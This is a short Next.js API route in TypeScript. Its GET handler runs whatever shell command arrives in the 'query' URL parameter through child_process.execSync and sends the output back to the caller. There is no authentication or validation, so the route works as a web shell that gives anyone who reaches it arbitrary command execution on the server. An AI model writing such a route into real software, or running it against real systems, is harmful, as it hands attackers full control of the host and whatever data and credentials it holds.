import { NextResponse, NextRequest } from "next/server";
import { execSync } from "child_process";

export const revalidate = 60 * 60 * 24;
async function GET(req: NextRequest) {
  const command = req.nextUrl?.searchParams?.get("query") || "pwd";

  try{
    const output = execSync(command, { encoding: "utf-8" });
    return new NextResponse(output);
  } catch (error: any) {
   return new NextResponse(JSON.stringify({message: error.stderr }), {
    status: 500
  });
  }
}
export { GET };
